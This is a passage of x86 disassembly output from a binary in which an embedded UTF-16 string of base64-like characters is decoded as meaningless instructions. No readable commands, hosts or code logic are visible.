  407dce:	00 34 00             	add    %dh,(%eax,%eax,1)
  407dd1:	4a                   	dec    %edx
  407dd2:	00 38                	add    %bh,(%eax)
  407dd4:	00 50 00             	add    %dl,0x0(%eax)
  407dd7:	53                   	push   %ebx
  407dd8:	00 6a 00             	add    %ch,0x0(%edx)
  407ddb:	6d                   	insl   (%dx),%es:(%edi)
  407ddc:	00 50 00             	add    %dl,0x0(%eax)
  407ddf:	72 00                	jb     0x407de1
  407de1:	35 00 79 00 6a       	xor    $0x6a007900,%eax
  407de6:	00 73 00             	add    %dh,0x0(%ebx)
  407de9:	78 00                	js     0x407deb
  407deb:	6a 00                	push   $0x0
  407ded:	51                   	push   %ecx
  407dee:	00 73 00             	add    %dh,0x0(%ebx)
  407df1:	42                   	inc    %edx
  407df2:	00 43 00             	add    %al,0x0(%ebx)
  407df5:	55                   	push   %ebp
  407df6:	00 34 00             	add    %dh,(%eax,%eax,1)
  407df9:	70 00                	jo     0x407dfb
  407dfb:	42                   	inc    %edx
  407dfc:	00 42 00             	add    %al,0x0(%edx)
  407dff:	72 00                	jb     0x407e01
  407e01:	6c                   	insb   (%dx),%es:(%edi)
  407e02:	00 62 00             	add    %ah,0x0(%edx)
  407e05:	67 00 75 00          	add    %dh,0x0(%di)
  407e09:	79 00                	jns    0x407e0b
  407e0b:	46                   	inc    %esi
  407e0c:	00 4e 00             	add    %cl,0x0(%esi)
  407e0f:	6c                   	insb   (%dx),%es:(%edi)
  407e10:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  407e14:	00 30                	add    %dh,(%eax)
  407e16:	00 6a 00             	add    %ch,0x0(%edx)
  407e19:	72 00                	jb     0x407e1b
  407e1b:	78 00                	js     0x407e1d
  407e1d:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  407e21:	6e                   	outsb  %ds:(%esi),(%dx)
  407e22:	00 4a 00             	add    %cl,0x0(%edx)
  407e25:	2b 00                	sub    (%eax),%eax
  407e27:	6a 00                	push   $0x0
  407e29:	51                   	push   %ecx
  407e2a:	00 36                	add    %dh,(%esi)
  407e2c:	00 37                	add    %dh,(%edi)
  407e2e:	00 66 00             	add    %ah,0x0(%esi)
  407e31:	33 00                	xor    (%eax),%eax
  407e33:	55                   	push   %ebp
  407e34:	00 71 00             	add    %dh,0x0(%ecx)
  407e37:	30 00                	xor    %al,(%eax)
  407e39:	7a 00                	jp     0x407e3b
  407e3b:	62 00                	bound  %eax,(%eax)
  407e3d:	71 00                	jno    0x407e3f
  407e3f:	72 00                	jb     0x407e41
  407e41:	39 00                	cmp    %eax,(%eax)
  407e43:	77 00                	ja     0x407e45
  407e45:	5a                   	pop    %edx
  407e46:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  407e4a:	00 6d 00             	add    %ch,0x0(%ebp)
  407e4d:	4e                   	dec    %esi
  407e4e:	00 57 00             	add    %dl,0x0(%edi)
  407e51:	58                   	pop    %eax
  407e52:	00 2b                	add    %ch,(%ebx)
  407e54:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  407e58:	00 55 00             	add    %dl,0x0(%ebp)
  407e5b:	4f                   	dec    %edi
  407e5c:	00 39                	add    %bh,(%ecx)
  407e5e:	00 35 00 65 00 50    	add    %dh,0x50006500
  407e64:	00 4f 00             	add    %cl,0x0(%edi)
  407e67:	38 00                	cmp    %al,(%eax)
  407e69:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6a:	00 31                	add    %dh,(%ecx)
  407e6c:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  407e70:	00 52 00             	add    %dl,0x0(%edx)
  407e73:	7a 00                	jp     0x407e75
  407e75:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  407e79:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  407e7d:	62 00                	bound  %eax,(%eax)
  407e7f:	4a                   	dec    %edx
  407e80:	00 39                	add    %bh,(%ecx)
  407e82:	00 70 00             	add    %dh,0x0(%eax)
  407e85:	42                   	inc    %edx
  407e86:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  407e8a:	00 48 00             	add    %cl,0x0(%eax)
  407e8d:	49                   	dec    %ecx
  407e8e:	00 56 00             	add    %dl,0x0(%esi)
  407e91:	39 00                	cmp    %eax,(%eax)
  407e93:	2f                   	das
  407e94:	00 4b 00             	add    %cl,0x0(%ebx)
  407e97:	66 00 56 00          	data16 add %dl,0x0(%esi)
  407e9b:	2f                   	das
  407e9c:	00 35 00 63 00 4d    	add    %dh,0x4d006300
  407ea2:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  407ea6:	00 6a 00             	add    %ch,0x0(%edx)
  407ea9:	33 00                	xor    (%eax),%eax
  407eab:	70 00                	jo     0x407ead
  407ead:	58                   	pop    %eax
  407eae:	00 38                	add    %bh,(%eax)
  407eb0:	00 36                	add    %dh,(%esi)
  407eb2:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  407eb6:	00 52 00             	add    %dl,0x0(%edx)
  407eb9:	58                   	pop    %eax
  407eba:	00 6b 00             	add    %ch,0x0(%ebx)
  407ebd:	42                   	inc    %edx
  407ebe:	00 41 00             	add    %al,0x0(%ecx)
  407ec1:	31 00                	xor    %eax,(%eax)
  407ec3:	78 00                	js     0x407ec5
  407ec5:	30 00                	xor    %al,(%eax)
  407ec7:	4d                   	dec    %ebp
  407ec8:	00 69 00             	add    %ch,0x0(%ecx)
  407ecb:	51                   	push   %ecx
  407ecc:	00 79 00             	add    %bh,0x0(%ecx)
  407ecf:	47                   	inc    %edi
  407ed0:	00 4a 00             	add    %cl,0x0(%edx)
  407ed3:	36 00 2f             	add    %ch,%ss:(%edi)
  407ed6:	00 71 00             	add    %dh,0x0(%ecx)
  407ed9:	57                   	push   %edi
  407eda:	00 43 00             	add    %al,0x0(%ebx)
  407edd:	42                   	inc    %edx
  407ede:	00 38                	add    %bh,(%eax)
  407ee0:	00 70 00             	add    %dh,0x0(%eax)
  407ee3:	63 00                	arpl   %eax,(%eax)
  407ee5:	61                   	popa
  407ee6:	00 58 00             	add    %bl,0x0(%eax)
  407ee9:	49                   	dec    %ecx
  407eea:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  407eee:	00 46 00             	add    %al,0x0(%esi)
  407ef1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ef2:	00 4f 00             	add    %cl,0x0(%edi)
  407ef5:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  407ef9:	57                   	push   %edi
  407efa:	00 53 00             	add    %dl,0x0(%ebx)
  407efd:	31 00                	xor    %eax,(%eax)
  407eff:	66 00 58 00          	data16 add %bl,0x0(%eax)
  407f03:	4a                   	dec    %edx
  407f04:	00 65 00             	add    %ah,0x0(%ebp)
  407f07:	45                   	inc    %ebp
  407f08:	00 4f 00             	add    %cl,0x0(%edi)
  407f0b:	52                   	push   %edx
  407f0c:	00 79 00             	add    %bh,0x0(%ecx)
  407f0f:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  407f13:	57                   	push   %edi
  407f14:	00 51 00             	add    %dl,0x0(%ecx)
  407f17:	6c                   	insb   (%dx),%es:(%edi)
  407f18:	00 41 00             	add    %al,0x0(%ecx)
  407f1b:	54                   	push   %esp
  407f1c:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  407f20:	00 6e 00             	add    %ch,0x0(%esi)
  407f23:	75 00                	jne    0x407f25
  407f25:	78 00                	js     0x407f27
  407f27:	31 00                	xor    %eax,(%eax)
  407f29:	73 00                	jae    0x407f2b
  407f2b:	35 00 65 00 73       	xor    $0x73006500,%eax
  407f30:	00 36                	add    %dh,(%esi)
  407f32:	00 55 00             	add    %dl,0x0(%ebp)
  407f35:	78 00                	js     0x407f37
  407f37:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  407f3b:	64 00 38             	add    %bh,%fs:(%eax)
  407f3e:	00 2f                	add    %ch,(%edi)
  407f40:	00 4a 00             	add    %cl,0x0(%edx)
  407f43:	58                   	pop    %eax
  407f44:	00 49 00             	add    %cl,0x0(%ecx)
  407f47:	33 00                	xor    (%eax),%eax
  407f49:	77 00                	ja     0x407f4b
  407f4b:	6a 00                	push   $0x0
  407f4d:	48                   	dec    %eax
  407f4e:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  407f52:	00 57 00             	add    %dl,0x0(%edi)
  407f55:	36 00 44 00 6a       	add    %al,%ss:0x6a(%eax,%eax,1)
  407f5a:	00 43 00             	add    %al,0x0(%ebx)
  407f5d:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  407f61:	68 00 6d 00 49       	push   $0x49006d00
  407f66:	00 5a 00             	add    %bl,0x0(%edx)
  407f69:	2f                   	das
  407f6a:	00 38                	add    %bh,(%eax)
  407f6c:	00 38                	add    %bh,(%eax)
  407f6e:	00 62 00             	add    %ah,0x0(%edx)
  407f71:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  407f75:	68 00 6f 00 61       	push   $0x61006f00
  407f7a:	00 45 00             	add    %al,0x0(%ebp)
  407f7d:	30 00                	xor    %al,(%eax)
  407f7f:	6b 00 57             	imul   $0x57,(%eax),%eax
  407f82:	00 45 00             	add    %al,0x0(%ebp)
  407f85:	74 00                	je     0x407f87
  407f87:	74 00                	je     0x407f89
  407f89:	69 00 57 00 45 00    	imul   $0x450057,(%eax),%eax
  407f8f:	2f                   	das
  407f90:	00 6a 00             	add    %ch,0x0(%edx)
  407f93:	71 00                	jno    0x407f95
  407f95:	54                   	push   %esp
  407f96:	00 50 00             	add    %dl,0x0(%eax)
  407f99:	6b 00 42             	imul   $0x42,(%eax),%eax
  407f9c:	00 79 00             	add    %bh,0x0(%ecx)
  407f9f:	55                   	push   %ebp
  407fa0:	00 41 00             	add    %al,0x0(%ecx)
  407fa3:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  407fa7:	69 00 6f 00 55 00    	imul   $0x55006f,(%eax),%eax
  407fad:	31 00                	xor    %eax,(%eax)
  407faf:	74 00                	je     0x407fb1
  407fb1:	73 00                	jae    0x407fb3
  407fb3:	32 00                	xor    (%eax),%al
  407fb5:	56                   	push   %esi
  407fb6:	00 6d 00             	add    %ch,0x0(%ebp)
  407fb9:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  407fbd:	58                   	pop    %eax
  407fbe:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  407fc2:	00 76 00             	add    %dh,0x0(%esi)
  407fc5:	51                   	push   %ecx
  407fc6:	00 6e 00             	add    %ch,0x0(%esi)
  407fc9:	37                   	aaa
  407fca:	00 31                	add    %dh,(%ecx)
  407fcc:	00 6b 00             	add    %ch,0x0(%ebx)
  407fcf:	4f                   	dec    %edi
  407fd0:	00 35 00 61 00 61    	add    %dh,0x61006100
  407fd6:	00 41 00             	add    %al,0x0(%ecx)
  407fd9:	30 00                	xor    %al,(%eax)
  407fdb:	54                   	push   %esp
  407fdc:	00 48 00             	add    %cl,0x0(%eax)
  407fdf:	63 00                	arpl   %eax,(%eax)
  407fe1:	6a 00                	push   $0x0
  407fe3:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  407fe7:	52                   	push   %edx
  407fe8:	00 4d 00             	add    %cl,0x0(%ebp)
  407feb:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  407fef:	6f                   	outsl  %ds:(%esi),(%dx)
  407ff0:	00 2b                	add    %ch,(%ebx)
  407ff2:	00 61 00             	add    %ah,0x0(%ecx)
  407ff5:	54                   	push   %esp
  407ff6:	00 6f 00             	add    %ch,0x0(%edi)
  407ff9:	61                   	popa
  407ffa:	00 32                	add    %dh,(%edx)
  407ffc:	00 2f                	add    %ch,(%edi)
  407ffe:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  408002:	00 65 00             	add    %ah,0x0(%ebp)
  408005:	47                   	inc    %edi
  408006:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40800a:	00 63 00             	add    %ah,0x0(%ebx)
  40800d:	31 00                	xor    %eax,(%eax)
  40800f:	71 00                	jno    0x408011
  408011:	42                   	inc    %edx
  408012:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  408016:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40801a:	00 77 00             	add    %dh,0x0(%edi)
  40801d:	58                   	pop    %eax
  40801e:	00 6c 00 30          	add    %ch,0x30(%eax,%eax,1)
  408022:	00 65 00             	add    %ah,0x0(%ebp)
  408025:	37                   	aaa
  408026:	00 4b 00             	add    %cl,0x0(%ebx)
  408029:	75 00                	jne    0x40802b
  40802b:	30 00                	xor    %al,(%eax)
  40802d:	52                   	push   %edx
  40802e:	00 30                	add    %dh,(%eax)
  408030:	00 62 00             	add    %ah,0x0(%edx)
  408033:	4b                   	dec    %ebx
  408034:	00 4b 00             	add    %cl,0x0(%ebx)
  408037:	37                   	aaa
  408038:	00 45 00             	add    %al,0x0(%ebp)
  40803b:	68 00 63 00 7a       	push   $0x7a006300
  408040:	00 2f                	add    %ch,(%edi)
  408042:	00 67 00             	add    %ah,0x0(%edi)
  408045:	68 00 6c 00 5a       	push   $0x5a006c00
  40804a:	00 59 00             	add    %bl,0x0(%ecx)
  40804d:	54                   	push   %esp
  40804e:	00 71 00             	add    %dh,0x0(%ecx)
  408051:	31 00                	xor    %eax,(%eax)
  408053:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  408057:	69 00 37 00 62 00    	imul   $0x620037,(%eax),%eax
  40805d:	57                   	push   %edi
  40805e:	00 6d 00             	add    %ch,0x0(%ebp)
  408061:	51                   	push   %ecx
  408062:	00 41 00             	add    %al,0x0(%ecx)
  408065:	53                   	push   %ebx
  408066:	00 51 00             	add    %dl,0x0(%ecx)
  408069:	6c                   	insb   (%dx),%es:(%edi)
  40806a:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40806e:	00 73 00             	add    %dh,0x0(%ebx)
  408071:	33 00                	xor    (%eax),%eax
  408073:	72 00                	jb     0x408075
  408075:	59                   	pop    %ecx
  408076:	00 68 00             	add    %ch,0x0(%eax)
  408079:	49                   	dec    %ecx
  40807a:	00 49 00             	add    %cl,0x0(%ecx)
  40807d:	45                   	inc    %ebp
  40807e:	00 32                	add    %dh,(%edx)
  408080:	00 36                	add    %dh,(%esi)
  408082:	00 35 00 57 00 70    	add    %dh,0x70005700
  408088:	00 30                	add    %dh,(%eax)
  40808a:	00 4d 00             	add    %cl,0x0(%ebp)
  40808d:	33 00                	xor    (%eax),%eax
  40808f:	6a 00                	push   $0x0
  408091:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  408095:	70 00                	jo     0x408097
  408097:	52                   	push   %edx
  408098:	00 34 00             	add    %dh,(%eax,%eax,1)
  40809b:	6e                   	outsb  %ds:(%esi),(%dx)
  40809c:	00 30                	add    %dh,(%eax)
  40809e:	00 52 00             	add    %dl,0x0(%edx)
  4080a1:	53                   	push   %ebx
  4080a2:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  4080a6:	00 53 00             	add    %dl,0x0(%ebx)
  4080a9:	58                   	pop    %eax
  4080aa:	00 71 00             	add    %dh,0x0(%ecx)
  4080ad:	6d                   	insl   (%dx),%es:(%edi)
  4080ae:	00 4f 00             	add    %cl,0x0(%edi)
  4080b1:	4d                   	dec    %ebp
  4080b2:	00 6d 00             	add    %ch,0x0(%ebp)
  4080b5:	34 00                	xor    $0x0,%al
  4080b7:	71 00                	jno    0x4080b9
  4080b9:	6b 00 77             	imul   $0x77,(%eax),%eax
  4080bc:	00 57 00             	add    %dl,0x0(%edi)
  4080bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4080c0:	00 33                	add    %dh,(%ebx)
  4080c2:	00 72 00             	add    %dh,0x0(%edx)
  4080c5:	4d                   	dec    %ebp
  4080c6:	00 61 00             	add    %ah,0x0(%ecx)
  4080c9:	61                   	popa
  4080ca:	00 77 00             	add    %dh,0x0(%edi)
  4080cd:	47                   	inc    %edi
  4080ce:	00 4a 00             	add    %cl,0x0(%edx)
  4080d1:	39 00                	cmp    %eax,(%eax)
  4080d3:	55                   	push   %ebp
  4080d4:	00 6b 00             	add    %ch,0x0(%ebx)
  4080d7:	4b                   	dec    %ebx
  4080d8:	00 39                	add    %bh,(%ecx)
  4080da:	00 78 00             	add    %bh,0x0(%eax)
  4080dd:	48                   	dec    %eax
  4080de:	00 70 00             	add    %dh,0x0(%eax)
  4080e1:	50                   	push   %eax
  4080e2:	00 35 00 71 00 51    	add    %dh,0x51007100
  4080e8:	00 39                	add    %bh,(%ecx)
  4080ea:	00 77 00             	add    %dh,0x0(%edi)
  4080ed:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  4080f1:	45                   	inc    %ebp
  4080f2:	00 6d 00             	add    %ch,0x0(%ebp)
  4080f5:	6b 00 59             	imul   $0x59,(%eax),%eax
  4080f8:	00 30                	add    %dh,(%eax)
  4080fa:	00 71 00             	add    %dh,0x0(%ecx)
  4080fd:	4c                   	dec    %esp
  4080fe:	00 51 00             	add    %dl,0x0(%ecx)
  408101:	39 00                	cmp    %eax,(%eax)
  408103:	50                   	push   %eax
  408104:	00 78 00             	add    %bh,0x0(%eax)
  408107:	43                   	inc    %ebx
  408108:	00 30                	add    %dh,(%eax)
  40810a:	00 77 00             	add    %dh,0x0(%edi)
  40810d:	4a                   	dec    %edx
  40810e:	00 47 00             	add    %al,0x0(%edi)
  408111:	49                   	dec    %ecx
  408112:	00 6d 00             	add    %ch,0x0(%ebp)
  408115:	2b 00                	sub    (%eax),%eax
  408117:	73 00                	jae    0x408119
  408119:	4c                   	dec    %esp
  40811a:	00 73 00             	add    %dh,0x0(%ebx)
  40811d:	70 00                	jo     0x40811f
  40811f:	37                   	aaa
  408120:	00 51 00             	add    %dl,0x0(%ecx)
  408123:	33 00                	xor    (%eax),%eax
  408125:	47                   	inc    %edi
  408126:	00 68 00             	add    %ch,0x0(%eax)
  408129:	66 00 30             	data16 add %dh,(%eax)
  40812c:	00 6d 00             	add    %ch,0x0(%ebp)
  40812f:	6f                   	outsl  %ds:(%esi),(%dx)
  408130:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  408134:	00 75 00             	add    %dh,0x0(%ebp)
  408137:	59                   	pop    %ecx
  408138:	00 43 00             	add    %al,0x0(%ebx)
  40813b:	7a 00                	jp     0x40813d
  40813d:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  408141:	45                   	inc    %ebp
  408142:	00 4b 00             	add    %cl,0x0(%ebx)
  408145:	45                   	inc    %ebp
  408146:	00 31                	add    %dh,(%ecx)
  408148:	00 2b                	add    %ch,(%ebx)
  40814a:	00 31                	add    %dh,(%ecx)
  40814c:	00 55 00             	add    %dl,0x0(%ebp)
  40814f:	49                   	dec    %ecx
  408150:	00 45 00             	add    %al,0x0(%ebp)
  408153:	4f                   	dec    %edi
  408154:	00 71 00             	add    %dh,0x0(%ecx)
  408157:	56                   	push   %esi
  408158:	00 38                	add    %bh,(%eax)
  40815a:	00 53 00             	add    %dl,0x0(%ebx)
  40815d:	78 00                	js     0x40815f
  40815f:	57                   	push   %edi
  408160:	00 6b 00             	add    %ch,0x0(%ebx)
  408163:	73 00                	jae    0x408165
  408165:	69 00 6f 00 4c 00    	imul   $0x4c006f,(%eax),%eax
  40816b:	2b 00                	sub    (%eax),%eax
  40816d:	6e                   	outsb  %ds:(%esi),(%dx)
  40816e:	00 2f                	add    %ch,(%edi)
  408170:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  408174:	00 70 00             	add    %dh,0x0(%eax)
  408177:	79 00                	jns    0x408179
  408179:	71 00                	jno    0x40817b
  40817b:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40817f:	33 00                	xor    (%eax),%eax
  408181:	75 00                	jne    0x408183
  408183:	41                   	inc    %ecx
  408184:	00 66 00             	add    %ah,0x0(%esi)
  408187:	54                   	push   %esp
  408188:	00 41 00             	add    %al,0x0(%ecx)
  40818b:	2b 00                	sub    (%eax),%eax
  40818d:	71 00                	jno    0x40818f
  40818f:	43                   	inc    %ebx
  408190:	00 66 00             	add    %ah,0x0(%esi)
  408193:	75 00                	jne    0x408195
  408195:	6d                   	insl   (%dx),%es:(%edi)
  408196:	00 63 00             	add    %ah,0x0(%ebx)
  408199:	2b 00                	sub    (%eax),%eax
  40819b:	72 00                	jb     0x40819d
  40819d:	62 00                	bound  %eax,(%eax)
  40819f:	34 00                	xor    $0x0,%al
  4081a1:	44                   	inc    %esp
  4081a2:	00 57 00             	add    %dl,0x0(%edi)
  4081a5:	57                   	push   %edi
  4081a6:	00 6e 00             	add    %ch,0x0(%esi)
  4081a9:	35 00 37 00 44       	xor    $0x44003700,%eax
  4081ae:	00 36                	add    %dh,(%esi)
  4081b0:	00 48 00             	add    %cl,0x0(%eax)
  4081b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b4:	00 75 00             	add    %dh,0x0(%ebp)
  4081b7:	5a                   	pop    %edx
  4081b8:	00 53 00             	add    %dl,0x0(%ebx)
  4081bb:	4e                   	dec    %esi
  4081bc:	00 42 00             	add    %al,0x0(%edx)
  4081bf:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  4081c3:	30 00                	xor    %al,(%eax)
  4081c5:	33 00                	xor    (%eax),%eax
  4081c7:	4d                   	dec    %ebp
  4081c8:	00 52 00             	add    %dl,0x0(%edx)
  4081cb:	44                   	inc    %esp
  4081cc:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  4081d0:	00 7a 00             	add    %bh,0x0(%edx)
  4081d3:	74 00                	je     0x4081d5
  4081d5:	57                   	push   %edi
  4081d6:	00 36                	add    %dh,(%esi)
  4081d8:	00 45 00             	add    %al,0x0(%ebp)
  4081db:	68 00 78 00 65       	push   $0x65007800
  4081e0:	00 57 00             	add    %dl,0x0(%edi)
  4081e3:	4d                   	dec    %ebp
  4081e4:	00 79 00             	add    %bh,0x0(%ecx)
  4081e7:	38 00                	cmp    %al,(%eax)
  4081e9:	69 00 62 00 36 00    	imul   $0x360062,(%eax),%eax
  4081ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4081f0:	00 53 00             	add    %dl,0x0(%ebx)
  4081f3:	37                   	aaa
  4081f4:	00 66 00             	add    %ah,0x0(%esi)
  4081f7:	70 00                	jo     0x4081f9
  4081f9:	63 00                	arpl   %eax,(%eax)
  4081fb:	4e                   	dec    %esi
  4081fc:	00 63 00             	add    %ah,0x0(%ebx)
  4081ff:	69 00 6c 00 31 00    	imul   $0x31006c,(%eax),%eax
  408205:	32 00                	xor    (%eax),%al
  408207:	73 00                	jae    0x408209
  408209:	67 00 4e 00          	add    %cl,0x0(%bp)
  40820d:	62 00                	bound  %eax,(%eax)
  40820f:	33 00                	xor    (%eax),%eax
  408211:	38 00                	cmp    %al,(%eax)
  408213:	4a                   	dec    %edx
  408214:	00 68 00             	add    %ch,0x0(%eax)
  408217:	35 00 56 00 75       	xor    $0x75005600,%eax
  40821c:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  408220:	00 2b                	add    %ch,(%ebx)
  408222:	00 47 00             	add    %al,0x0(%edi)
  408225:	61                   	popa
  408226:	00 42 00             	add    %al,0x0(%edx)
  408229:	49                   	dec    %ecx
  40822a:	00 63 00             	add    %ah,0x0(%ebx)
  40822d:	32 00                	xor    (%eax),%al
  40822f:	41                   	inc    %ecx
  408230:	00 51 00             	add    %dl,0x0(%ecx)
  408233:	4c                   	dec    %esp
  408234:	00 48 00             	add    %cl,0x0(%eax)
  408237:	74 00                	je     0x408239
  408239:	4e                   	dec    %esi
  40823a:	00 36                	add    %dh,(%esi)
  40823c:	00 56 00             	add    %dl,0x0(%esi)
  40823f:	73 00                	jae    0x408241
  408241:	73 00                	jae    0x408243
  408243:	31 00                	xor    %eax,(%eax)
  408245:	7a 00                	jp     0x408247
  408247:	4c                   	dec    %esp
  408248:	00 6b 00             	add    %ch,0x0(%ebx)
  40824b:	4b                   	dec    %ebx
  40824c:	00 4d 00             	add    %cl,0x0(%ebp)
  40824f:	57                   	push   %edi
  408250:	00 45 00             	add    %al,0x0(%ebp)
  408253:	73 00                	jae    0x408255
  408255:	4e                   	dec    %esi
  408256:	00 46 00             	add    %al,0x0(%esi)
  408259:	4f                   	dec    %edi
  40825a:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  40825e:	00 32                	add    %dh,(%edx)
  408260:	00 6f 00             	add    %ch,0x0(%edi)
  408263:	69 00 50 00 6b 00    	imul   $0x6b0050,(%eax),%eax
  408269:	2b 00                	sub    (%eax),%eax
  40826b:	55                   	push   %ebp
  40826c:	00 41 00             	add    %al,0x0(%ecx)
  40826f:	32 00                	xor    (%eax),%al
  408271:	38 00                	cmp    %al,(%eax)
  408273:	6a 00                	push   $0x0
  408275:	70 00                	jo     0x408277
  408277:	4d                   	dec    %ebp
  408278:	00 42 00             	add    %al,0x0(%edx)
  40827b:	49                   	dec    %ecx
  40827c:	00 69 00             	add    %ch,0x0(%ecx)
  40827f:	72 00                	jb     0x408281
  408281:	32 00                	xor    (%eax),%al
  408283:	71 00                	jno    0x408285
  408285:	58                   	pop    %eax
  408286:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40828a:	00 69 00             	add    %ch,0x0(%ecx)
  40828d:	35 00 32 00 55       	xor    $0x55003200,%eax
  408292:	00 52 00             	add    %dl,0x0(%edx)
  408295:	4e                   	dec    %esi
  408296:	00 32                	add    %dh,(%edx)
  408298:	00 46 00             	add    %al,0x0(%esi)
  40829b:	31 00                	xor    %eax,(%eax)
  40829d:	44                   	inc    %esp
  40829e:	00 4b 00             	add    %cl,0x0(%ebx)
  4082a1:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  4082a5:	79 00                	jns    0x4082a7
  4082a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a8:	00 6e 00             	add    %ch,0x0(%esi)
  4082ab:	50                   	push   %eax
  4082ac:	00 2f                	add    %ch,(%edi)
  4082ae:	00 57 00             	add    %dl,0x0(%edi)
  4082b1:	39 00                	cmp    %eax,(%eax)
  4082b3:	30 00                	xor    %al,(%eax)
  4082b5:	59                   	pop    %ecx
  4082b6:	00 6b 00             	add    %ch,0x0(%ebx)
  4082b9:	2b 00                	sub    (%eax),%eax
  4082bb:	2f                   	das
  4082bc:	00 73 00             	add    %dh,0x0(%ebx)
  4082bf:	76 00                	jbe    0x4082c1
  4082c1:	71 00                	jno    0x4082c3
  4082c3:	2f                   	das
  4082c4:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  4082c8:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  4082cc:	00 2f                	add    %ch,(%edi)
  4082ce:	00 6e 00             	add    %ch,0x0(%esi)
  4082d1:	52                   	push   %edx
  4082d2:	00 39                	add    %bh,(%ecx)
  4082d4:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  4082d8:	00 45 00             	add    %al,0x0(%ebp)
  4082db:	37                   	aaa
  4082dc:	00 57 00             	add    %dl,0x0(%edi)
  4082df:	71 00                	jno    0x4082e1
  4082e1:	45                   	inc    %ebp
  4082e2:	00 32                	add    %dh,(%edx)
  4082e4:	00 4e 00             	add    %cl,0x0(%esi)
  4082e7:	32 00                	xor    (%eax),%al
  4082e9:	46                   	inc    %esi
  4082ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  4082ed:	67 00 74 00          	add    %dh,0x0(%si)
  4082f1:	74 00                	je     0x4082f3
  4082f3:	6a 00                	push   $0x0
  4082f5:	63 00                	arpl   %eax,(%eax)
  4082f7:	45                   	inc    %ebp
  4082f8:	00 63 00             	add    %ah,0x0(%ebx)
  4082fb:	4b                   	dec    %ebx
  4082fc:	00 38                	add    %bh,(%eax)
  4082fe:	00 4e 00             	add    %cl,0x0(%esi)
  408301:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  408305:	2b 00                	sub    (%eax),%eax
  408307:	62 00                	bound  %eax,(%eax)
  408309:	51                   	push   %ecx
  40830a:	00 6b 00             	add    %ch,0x0(%ebx)
  40830d:	6c                   	insb   (%dx),%es:(%edi)
  40830e:	00 59 00             	add    %bl,0x0(%ecx)
  408311:	46                   	inc    %esi
  408312:	00 66 00             	add    %ah,0x0(%esi)
  408315:	38 00                	cmp    %al,(%eax)
  408317:	4e                   	dec    %esi
  408318:	00 5a 00             	add    %bl,0x0(%edx)
  40831b:	2b 00                	sub    (%eax),%eax
  40831d:	54                   	push   %esp
  40831e:	00 67 00             	add    %ah,0x0(%edi)
  408321:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  408325:	39 00                	cmp    %eax,(%eax)
  408327:	6d                   	insl   (%dx),%es:(%edi)
  408328:	00 4d 00             	add    %cl,0x0(%ebp)
  40832b:	43                   	inc    %ebx
  40832c:	00 6e 00             	add    %ch,0x0(%esi)
  40832f:	4f                   	dec    %edi
  408330:	00 4a 00             	add    %cl,0x0(%edx)
  408333:	6b 00 37             	imul   $0x37,(%eax),%eax
  408336:	00 2b                	add    %ch,(%ebx)
  408338:	00 47 00             	add    %al,0x0(%edi)
  40833b:	32 00                	xor    (%eax),%al
  40833d:	71 00                	jno    0x40833f
  40833f:	59                   	pop    %ecx
  408340:	00 53 00             	add    %dl,0x0(%ebx)
  408343:	30 00                	xor    %al,(%eax)
  408345:	72 00                	jb     0x408347
  408347:	48                   	dec    %eax
  408348:	00 38                	add    %bh,(%eax)
  40834a:	00 57 00             	add    %dl,0x0(%edi)
  40834d:	73 00                	jae    0x40834f
  40834f:	55                   	push   %ebp
  408350:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  408354:	00 76 00             	add    %dh,0x0(%esi)
